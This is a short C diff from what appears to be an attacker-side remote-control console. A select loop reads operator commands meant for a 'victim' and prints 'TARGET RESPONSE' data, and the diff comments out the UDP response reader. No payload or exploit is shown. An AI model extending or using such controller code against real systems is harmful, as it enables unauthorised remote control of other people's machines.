@@ -189,11 +189,11 @@ void* select_call(void* arg) {
         else if (fd_num == 0) continue; // time out
         for (int i = 0; i < fd_max + 1; i++) {
             if (FD_ISSET(i, &cpy_reads)) {
-                if (i == opts->attacker_socket_udp) {
-                    read(opts->attacker_socket_udp, (struct recv_udp *)&recv_pkt, 64);
-                    printf("[ TARGET RESPONSE ]\n%s\n", buffer);
-                    memset(buffer, 0, sizeof(char) * 256);
-                }
+//                if (i == opts->attacker_socket_udp) {
+//                    read(opts->attacker_socket_udp, (struct recv_udp *)&recv_pkt, 64);
+//                    printf("[ TARGET RESPONSE ]\n%s\n", buffer);
+//                    memset(buffer, 0, sizeof(char) * 256);
+//                }
                 if (i == STDIN_FILENO) {
                     puts("============ RESULT ============");
                     if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
